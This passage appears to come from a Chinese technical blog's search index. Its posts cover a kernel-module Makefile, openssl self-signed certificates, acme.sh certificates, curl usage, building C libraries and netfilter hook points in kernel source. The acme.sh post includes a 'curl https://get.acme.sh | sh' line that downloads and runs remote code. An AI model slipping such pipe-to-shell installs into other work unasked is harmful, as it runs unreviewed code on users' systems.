class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">PWD ?= <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line"><span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm *.o *.mod *.symvers</span><br><span class="line">obj-m += main.o</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux内核驱动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openssl自签证书</title>
      <link href="/2022/06/06/SSL%E8%AF%81%E4%B9%A6%E8%8E%B7%E5%8F%96/"/>
      <url>/2022/06/06/SSL%E8%AF%81%E4%B9%A6%E8%8E%B7%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h2 id="1-openssl自签证书"><a href="#1-openssl自签证书" class="headerlink" title="1.openssl自签证书"></a>1.openssl自签证书</h2><p>这种方法获取的证书不被浏览器信任，因为是我们自己给自己办法的证书，访问的时候一般会提示危险</p><h5 id="1-生成CA私钥"><a href="#1-生成CA私钥" class="headerlink" title="1.生成CA私钥"></a>1.生成CA私钥</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048</span><br><span class="line"><span class="comment">#生成rsa私钥，2048位强度，server.key是秘钥文件名。</span></span><br></pre></td></tr></table></figure><h5 id="2-生成CA根证书请求信息"><a href="#2-生成CA根证书请求信息" class="headerlink" title="2.生成CA根证书请求信息"></a>2.生成CA根证书请求信息</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key ca.key -out ca.csr</span><br></pre></td></tr></table></figure><h5 id="3-生成CA根证书"><a href="#3-生成CA根证书" class="headerlink" title="3.生成CA根证书"></a>3.生成CA根证书</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -days 365 -<span class="keyword">in</span> ca.csr -signkey ca.key -out ca.crt</span><br></pre></td></tr></table></figure><h5 id="4-生成私钥"><a href="#4-生成私钥" class="headerlink" title="4.生成私钥"></a>4.生成私钥</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out ssl.key 2048</span><br></pre></td></tr></table></figure><h5 id="5-生成证书的申请信息"><a href="#5-生成证书的申请信息" class="headerlink" title="5.生成证书的申请信息"></a>5.生成证书的申请信息</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key ssl.key -out ssl.csr</span><br></pre></td></tr></table></figure><h5 id="6-使用CA的私钥进行签名"><a href="#6-使用CA的私钥进行签名" class="headerlink" title="6.使用CA的私钥进行签名"></a>6.使用CA的私钥进行签名</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -<span class="keyword">in</span> ssl.csr -out ssl.crt</span><br></pre></td></tr></table></figure><h2 id="2-使用acme获取权威证书"><a href="#2-使用acme获取权威证书" class="headerlink" title="2.使用acme获取权威证书"></a>2.使用acme获取权威证书</h2><p>这种证书一般会被信任，但是前提是我们需要有域名，如果服务器在国外，无需备案</p><h5 id="1-安装acme-sh"><a href="#1-安装acme-sh" class="headerlink" title="1.安装acme.sh"></a>1.安装acme.sh</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://get.acme.sh | sh <span class="comment">#在国内网络环境可能会连接失败，需要挂上代理</span></span><br></pre></td></tr></table></figure><h5 id="2-设置acme-sh别名"><a href="#2-设置acme-sh别名" class="headerlink" title="2.设置acme.sh别名"></a>2.设置acme.sh别名</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> acme.sh=~/.acme.sh/acme.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;alias acme.sh=~/.acme.sh/acme.sh&#x27;</span> &gt;&gt; .bashrc</span><br></pre></td></tr></table></figure><h5 id="3-申请证书"><a href="#3-申请证书" class="headerlink" title="3.申请证书"></a>3.申请证书</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">acme.sh --set-default-ca --server letsencrypt <span class="comment">#设置默认证书办法机构为letsencrytp</span></span><br><span class="line">acme.sh --issue -d example.com  --webroot <span class="variable">$&#123;WEBROOT&#125;</span> <span class="comment">#这里可以通过指定多个-d选项指定多个域名</span></span><br></pre></td></tr></table></figure><h5 id="4-设置acme-sh自动更新"><a href="#4-设置acme-sh自动更新" class="headerlink" title="4.设置acme.sh自动更新"></a>4.设置acme.sh自动更新</h5><pre><code class="bash">#将这个记录放到计划任务56 * * * * &quot;/root/.acme.sh&quot;/acme.sh --cron --home &quot;/root/.acme.sh&quot; &gt; /dev/null</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>curl基本使用</title>
      <link href="/2022/05/26/curl%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/05/26/curl%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="curl基本使用"><a href="#curl基本使用" class="headerlink" title="curl基本使用"></a>curl基本使用</h1><h3 id="1-什么是curl"><a href="#1-什么是curl" class="headerlink" title="1.什么是curl?"></a>1.什么是curl?</h3><p>curl是一个命令行工具,用于向指定的url发送请求,支持http,mqtt,ftp,rtmp,pop2,scp等各种协议</p><h3 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">curl --verbose www.baidu.com</span><br><span class="line"><span class="comment">#verbose 用于打开verbose,使用这个模式可以查看到发送的数据包信息</span></span><br><span class="line">curl -A <span class="string">&quot;curl&quot;</span> www.baidu.com</span><br><span class="line"><span class="comment">#-A参数指定特定的User-Agent</span></span><br><span class="line">curl -A <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0&quot;</span> https://www.baidu.com/index.html</span><br><span class="line"><span class="comment">#-b参数用于向服务器传输cookie,也可以指定cookie文件</span></span><br><span class="line">curl -b <span class="string">&quot;x_key=asjdflkdjaslfdjklasjlkf&quot;</span> http://www.google.com/index.html</span><br><span class="line"><span class="comment">#-c参数用于将服务器设置的cookie写入一个文件</span></span><br><span class="line">curl -c coookie.txt -v http://www.baidu.com/index.html</span><br><span class="line"><span class="comment">#-d,--data-urlencode参数用于发送post请求的数据</span></span><br><span class="line">curl -d <span class="string">&quot;name=admin&amp;password=password&quot;</span> -X POST https://www.baidu.com/index.html</span><br><span class="line"><span class="comment">#-X参数用与指定发送的请求方式如Get Post</span></span><br><span class="line"><span class="comment">#-e参数用于指定refer头</span></span><br><span class="line">curl -e <span class="string">&quot;http://www.baidu.com/index.html&quot;</span> https://www.google.com</span><br><span class="line"><span class="comment">#-F参数用于上传二进制文件</span></span><br><span class="line">curl -F <span class="string">&#x27;file=@photo.png&#x27;</span> https://baidu.com/profile</span><br><span class="line"><span class="comment">#-F参数可以指定上传的文件的MIME类型</span></span><br><span class="line">curl -F <span class="string">&quot;file=@photo.png;image/png&quot;</span> -X POST https://www.baidu.com/profile</span><br><span class="line">curl -F <span class="string">&quot;file=@photo.png;filename=me.png&quot;</span> -X POST https://www.baidu.com/profile</span><br></pre></td></tr></table></figure><h3 id="3-curl配置文件"><a href="#3-curl配置文件" class="headerlink" title="3.curl配置文件"></a>3.curl配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/.curlrc <span class="comment">#用户配置文件</span></span><br><span class="line">/etc/curlrc <span class="comment">#系统配置文件</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件和系统配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件基本使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c语言库的制作</title>
      <link href="/2022/05/18/c%E8%AF%AD%E8%A8%80%E5%BA%93%E7%9A%84%E5%88%B6%E4%BD%9C/"/>
      <url>/2022/05/18/c%E8%AF%AD%E8%A8%80%E5%BA%93%E7%9A%84%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="c语言库的制作"><a href="#c语言库的制作" class="headerlink" title="c语言库的制作"></a>c语言库的制作</h1><h3 id="1-静态库和动态库的制作"><a href="#1-静态库和动态库的制作" class="headerlink" title="1.静态库和动态库的制作"></a>1.静态库和动态库的制作</h3><h5 id="1-准备头文件和对应的api实现源码"><a href="#1-准备头文件和对应的api实现源码" class="headerlink" title="1.准备头文件和对应的api实现源码"></a>1.准备头文件和对应的api实现源码</h5><p>1.mylib.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">interface</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>1.mylib.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mylib.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">interface</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this is my first interface &quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="1-制作静态库"><a href="#1-制作静态库" class="headerlink" title="1.制作静态库"></a>1.制作静态库</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编译目标文件</span></span><br><span class="line">gcc -c mylib.c -o mylib.o</span><br><span class="line"><span class="comment">#制作静态库文件</span></span><br><span class="line">ar crs libmylib.a mylib.o</span><br></pre></td></tr></table></figure><h6 id="2-制作动态库"><a href="#2-制作动态库" class="headerlink" title="2.制作动态库"></a>2.制作动态库</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编译目标文件</span></span><br><span class="line">gcc -c mylib.c -o mylib.o</span><br><span class="line"><span class="comment">#制作动态链接库、</span></span><br><span class="line">gcc -shared -o libmylib.so mylib.o</span><br></pre></td></tr></table></figure><h3 id="2-自定义库的使用"><a href="#2-自定义库的使用" class="headerlink" title="2.自定义库的使用"></a>2.自定义库的使用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*main.c*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mylib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    interface();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="1-静态库的使用"><a href="#1-静态库的使用" class="headerlink" title="1.静态库的使用"></a>1.静态库的使用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line">gcc -L. -lmylib main.c -o main</span><br><span class="line"><span class="comment">#运行</span></span><br><span class="line">./main</span><br></pre></td></tr></table></figure><h6 id="2-动态库的使用"><a href="#2-动态库的使用" class="headerlink" title="2.动态库的使用"></a>2.动态库的使用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">编译目标文件</span><br><span class="line">gcc -L. -lmylib main.c -o main</span><br><span class="line"><span class="comment">#运行</span></span><br><span class="line"><span class="comment">#是指动态链接库的路径,(可以设置LD_LIBRARY_PATH的值或者是将编译好的动态链接库拷贝至/usr/lib路径下)</span></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=.</span><br><span class="line">./main</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 嵌入式开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iptables的基本原理以及使用</title>
      <link href="/2022/04/30/iptables%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/04/30/iptables%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="netfilter-iptables使用"><a href="#netfilter-iptables使用" class="headerlink" title="netfilter&#x2F;iptables使用"></a>netfilter&#x2F;iptables使用</h1><h3 id="1-什么是iptables？"><a href="#1-什么是iptables？" class="headerlink" title="1.什么是iptables？"></a>1.什么是iptables？</h3><p>netfliter&#x2F;iptables是linux一个用来过滤流量以及数据包转发的内核模块</p><p>是linux内核的一部分,iptables是linux中的一个工具,运行在用户空间,可以控制netfliter中增加修改删除数据包的处理规则,netfliter位于网卡和内核之间,可以控制计算机的进出流量</p><h3 id="2-内核源码分析"><a href="#2-内核源码分析" class="headerlink" title="2.内核源码分析"></a>2.内核源码分析</h3><h5 id="1-hooks函数"><a href="#1-hooks函数" class="headerlink" title="1.hooks函数"></a>1.hooks函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nf_inet_hooks</span> &#123;</span></span><br><span class="line">NF_INET_PRE_ROUTING,</span><br><span class="line">NF_INET_LOCAL_IN,</span><br><span class="line">NF_INET_FORWARD,</span><br><span class="line">NF_INET_LOCAL_OUT,</span><br><span class="line">NF_INET_POST_ROUTING,</span><br><span class="line">NF_INET_NUMHOOKS,</span><br><span class="line">NF_INET_INGRESS = NF       </span><br><span class="line"><span class="comment">//hooks函数定义</span></span><br></pre></td></tr></table></figure><h5 id="2-第一个挂接点-NF-INET-PRE-ROUTING"><a href="#2-第一个挂接点-NF-INET-PRE-ROUTING" class="headerlink" title="2.第一个挂接点(NF_INET_PRE_ROUTING)"></a>2.第一个挂接点(NF_INET_PRE_ROUTING)</h5><p>这个挂接点是网卡接受数据之后第一个执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//网卡接受数据后调用的第一个函数就是ip_rcv函数,ipv6为ip6_rcv</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ip_rcv</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="keyword">struct</span> net_device *dev, <span class="keyword">struct</span> packet_type *pt,</span></span><br><span class="line"><span class="params">   <span class="keyword">struct</span> net_device *orig_dev)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> dev_net(dev);</span><br><span class="line"></span><br><span class="line">skb = ip_rcv_core(skb, net);</span><br><span class="line"><span class="keyword">if</span> (skb == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> NET_RX_DROP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING,</span><br><span class="line">       net, <span class="literal">NULL</span>, skb, dev, <span class="literal">NULL</span>,</span><br><span class="line">       ip_rcv_finish);<span class="comment">//下一个挂接点NF_INET_PRE_ROUTING</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-第二个挂接点（NF-INET-LOCAL-IN"><a href="#3-第二个挂接点（NF-INET-LOCAL-IN" class="headerlink" title="3.第二个挂接点（NF_INET_LOCAL_IN)"></a>3.第二个挂接点（NF_INET_LOCAL_IN)</h5><p>这个挂接点在数据包进行路由之后,数据包目标ip是本机的时候执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ip_local_deliver</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Reassemble IP fragments.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> dev_net(skb-&gt;dev);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ip_is_fragment(ip_hdr(skb))) &#123;</span><br><span class="line"><span class="keyword">if</span> (ip_defrag(net, skb, IP_DEFRAG_LOCAL_DELIVER))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_LOCAL_IN,</span><br><span class="line">       net, <span class="literal">NULL</span>, skb, skb-&gt;dev, <span class="literal">NULL</span>,</span><br><span class="line">       ip_local_deliver_finish);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-第三个挂接点-NF-INET-FORWARD"><a href="#3-第三个挂接点-NF-INET-FORWARD" class="headerlink" title="3.第三个挂接点(NF_INET_FORWARD)"></a>3.第三个挂接点(NF_INET_FORWARD)</h5><p>数据包进入网络层进行路由时,数据包路由选择后目标ip不是本机时执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ip_forward</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line">u32 mtu;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span>;</span><span class="comment">/* Our header */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtable</span> *<span class="title">rt</span>;</span><span class="comment">/* Route we use */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_options</span> *<span class="title">opt</span>=</span> &amp;(IPCB(skb)-&gt;opt);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* that should never happen */</span></span><br><span class="line"><span class="keyword">if</span> (skb-&gt;pkt_type != PACKET_HOST)</span><br><span class="line"><span class="keyword">goto</span> drop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(skb-&gt;sk))</span><br><span class="line"><span class="keyword">goto</span> drop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (skb_warn_if_lro(skb))</span><br><span class="line"><span class="keyword">goto</span> drop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!xfrm4_policy_check(<span class="literal">NULL</span>, XFRM_POLICY_FWD, skb))</span><br><span class="line"><span class="keyword">goto</span> drop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IPCB(skb)-&gt;opt.router_alert &amp;&amp; ip_call_ra_chain(skb))</span><br><span class="line"><span class="keyword">return</span> NET_RX_SUCCESS;</span><br><span class="line"></span><br><span class="line">skb_forward_csum(skb);</span><br><span class="line">net = dev_net(skb-&gt;dev);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *According to the RFC, we must first decrease the TTL field. If</span></span><br><span class="line"><span class="comment"> *that reaches zero, we must reply an ICMP control message telling</span></span><br><span class="line"><span class="comment"> *that the packet&#x27;s lifetime expired.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ip_hdr(skb)-&gt;ttl &lt;= <span class="number">1</span>)</span><br><span class="line"><span class="keyword">goto</span> too_many_hops;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!xfrm4_route_forward(skb))</span><br><span class="line"><span class="keyword">goto</span> drop;</span><br><span class="line"></span><br><span class="line">rt = skb_rtable(skb);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opt-&gt;is_strictroute &amp;&amp; rt-&gt;rt_uses_gateway)</span><br><span class="line"><span class="keyword">goto</span> sr_failed;</span><br><span class="line"></span><br><span class="line">IPCB(skb)-&gt;flags |= IPSKB_FORWARDED;</span><br><span class="line">mtu = ip_dst_mtu_maybe_forward(&amp;rt-&gt;dst, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (ip_exceeds_mtu(skb, mtu)) &#123;</span><br><span class="line">IP_INC_STATS(net, IPSTATS_MIB_FRAGFAILS);</span><br><span class="line">icmp_send(skb, ICMP_DEST_UNREACH, ICMP_FRAG_NEEDED,</span><br><span class="line">  htonl(mtu));</span><br><span class="line"><span class="keyword">goto</span> drop;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We are about to mangle packet. Copy it! */</span></span><br><span class="line"><span class="keyword">if</span> (skb_cow(skb, LL_RESERVED_SPACE(rt-&gt;dst.dev)+rt-&gt;dst.header_len))</span><br><span class="line"><span class="keyword">goto</span> drop;</span><br><span class="line">iph = ip_hdr(skb);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Decrease ttl after skb cow done */</span></span><br><span class="line">ip_decrease_ttl(iph);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *We now generate an ICMP HOST REDIRECT giving the route</span></span><br><span class="line"><span class="comment"> *we calculated.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (IPCB(skb)-&gt;flags &amp; IPSKB_DOREDIRECT &amp;&amp; !opt-&gt;srr &amp;&amp;</span><br><span class="line">    !skb_sec_path(skb))</span><br><span class="line">ip_rt_send_redirect(skb);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (net-&gt;ipv4.sysctl_ip_fwd_update_priority)</span><br><span class="line">skb-&gt;priority = rt_tos2priority(iph-&gt;tos);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_FORWARD,</span><br><span class="line">       net, <span class="literal">NULL</span>, skb, skb-&gt;dev, rt-&gt;dst.dev,</span><br><span class="line">       ip_forward_finish);</span><br><span class="line"></span><br><span class="line">sr_failed:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Strict routing permits no gatewaying</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> icmp_send(skb, ICMP_DEST_UNREACH, ICMP_SR_FAILED, <span class="number">0</span>);</span><br><span class="line"> <span class="keyword">goto</span> drop;</span><br><span class="line"></span><br><span class="line">too_many_hops:</span><br><span class="line"><span class="comment">/* Tell the sender its packet died... */</span></span><br><span class="line">__IP_INC_STATS(net, IPSTATS_MIB_INHDRERRORS);</span><br><span class="line">icmp_send(skb, ICMP_TIME_EXCEEDED, ICMP_EXC_TTL, <span class="number">0</span>);</span><br><span class="line">drop:</span><br><span class="line">kfree_skb(skb);</span><br><span class="line"><span class="keyword">return</span> NET_RX_DROP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-第四个挂接点（NF-INET-LOCAL-OUT"><a href="#4-第四个挂接点（NF-INET-LOCAL-OUT" class="headerlink" title="4.第四个挂接点（NF_INET_LOCAL_OUT)"></a>4.第四个挂接点（NF_INET_LOCAL_OUT)</h5><p>本机数据向外发送数据时刚从传输层出来第一个执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __ip_local_out(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> sk_buff *skb)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> =</span> ip_hdr(skb);</span><br><span class="line"></span><br><span class="line">iph-&gt;tot_len = htons(skb-&gt;len);</span><br><span class="line">ip_send_check(iph);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if egress device is enslaved to an L3 master device pass the</span></span><br><span class="line"><span class="comment"> * skb to its handler for processing</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">skb = l3mdev_ip_out(sk, skb);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!skb))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">skb-&gt;protocol = htons(ETH_P_IP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nf_hook(NFPROTO_IPV4, NF_INET_LOCAL_OUT,</span><br><span class="line">       net, sk, skb, <span class="literal">NULL</span>, 